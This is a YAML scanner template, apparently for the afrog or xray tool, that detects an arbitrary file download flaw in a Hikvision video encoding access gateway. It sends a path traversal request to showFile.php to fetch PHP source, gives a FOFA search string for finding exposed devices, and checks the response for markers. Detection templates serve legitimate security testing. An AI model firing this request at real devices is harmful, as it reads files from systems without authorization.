id: hikvision-showfile-file-read

info:
  name: HIKVISION 视频编码设备接入网关 showFile.php 任意文件下载漏洞
  author: zan8in
  severity: high
  description: |-
    海康威视视频接入网关系统在页面/serverLog/showFile.php的参数fileName存在任意文件下载漏洞
    fofa: title="视频编码设备接入网关"
  tags: hikvision,showfile,file-read
  created: 2024/01/17

rules:
  r0:
    request:
      method: GET
      path: /serverLog/showFile.php?fileName=../web/html/main.php
    expression: response.status == 200 && response.body.bcontains(b'$_SERVER[\'HTTP_HOST\'];') && response.body.bcontains(b'$_POST[\'userName\'];')
expression: r0()
